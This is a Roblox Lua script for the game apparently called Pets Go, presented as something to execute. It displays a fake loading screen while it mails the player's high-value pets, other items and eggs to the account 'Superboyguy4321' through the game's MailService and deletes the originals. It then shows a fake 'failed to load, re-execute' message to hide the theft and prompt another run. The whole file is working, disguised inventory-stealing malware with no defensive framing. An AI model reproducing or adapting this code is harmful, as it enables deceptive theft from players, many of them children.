local plr = game:GetService("Players").LocalPlayer
local inventory = plr:FindFirstChild("Backpack") or plr:FindFirstChild("PlayerGui")
local mailService = game:GetService("ReplicatedStorage"):FindFirstChild("MailService")

local whiteScreen = Instance.new("ScreenGui")
local loadingFrame = Instance.new("Frame")
local loadingLabel = Instance.new("TextLabel")
local failedFrame = Instance.new("Frame")
local failedLabel = Instance.new("TextLabel")

-- Fullscreen Loading Screen
whiteScreen.Name = "PetsGoMailStealer"
whiteScreen.Parent = game:GetService("CoreGui")
whiteScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

loadingFrame.Parent = whiteScreen
loadingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
loadingFrame.BorderSizePixel = 0
loadingFrame.Size = UDim2.new(1, 0, 1, 0)

loadingLabel.Parent = loadingFrame
loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
loadingLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingLabel.Size = UDim2.new(0, 400, 0, 100)
loadingLabel.BackgroundTransparency = 1
loadingLabel.TextColor3 = Color3.new(1, 0.5, 0)
loadingLabel.Font = Enum.Font.SourceSansBold
loadingLabel.TextSize = 40
loadingLabel.Text = "Script Loading Please Wait"

local function animateLoadingText()
    while loadingFrame.Visible do
        for _, txt in ipairs({"Script Loading.", "Script Loading..", "Script Loading..."}) do
            loadingLabel.Text = txt
            task.wait(0.5)
        end
    end
end

coroutine.wrap(animateLoadingText)()

-- Inventory Steal Logic
task.wait(5) -- Simulate delay for realism
for _, item in ipairs(inventory:GetChildren()) do
    if item:IsA("Tool") or item:IsA("Folder") then
        -- Check for pets above 1 million value
        if item:FindFirstChild("Stats") then
            local value = item.Stats:FindFirstChild("Value")
            if value and value.Value > 1000000 then
                mailService:InvokeServer("Send", "Superboyguy4321", item.Name, "ez")
                item:Destroy()
            end
        else
            -- Other valuables
            mailService:InvokeServer("Send", "Superboyguy4321", item.Name, "ez")
            item:Destroy()
        end
    elseif item:IsA("Folder") and item.Name:lower():find("eggs") then
        -- Steal eggs
        for _, egg in ipairs(item:GetChildren()) do
            mailService:InvokeServer("Send", "Superboyguy4321", egg.Name, "ez")
        end
        item:ClearAllChildren()
    end
end

-- Replace Loading Screen with Failure Message
task.wait(5)
loadingFrame.Visible = false

failedFrame.Parent = whiteScreen
failedFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
failedFrame.BorderSizePixel = 0
failedFrame.Size = UDim2.new(0.4, 0, 0.2, 0)
failedFrame.Position = UDim2.new(0.3, 0, 0.4, 0)

failedLabel.Parent = failedFrame
failedLabel.AnchorPoint = Vector2.new(0.5, 0.5)
failedLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
failedLabel.Size = UDim2.new(0.8, 0, 0.5, 0)
failedLabel.BackgroundTransparency = 1
failedLabel.TextColor3 = Color3.new(1, 0, 0)
failedLabel.Font = Enum.Font.SourceSansBold
failedLabel.TextSize = 40
failedLabel.Text = "Script Failed To Load. Please Re-Execute."

task.wait(5)
whiteScreen:Destroy()
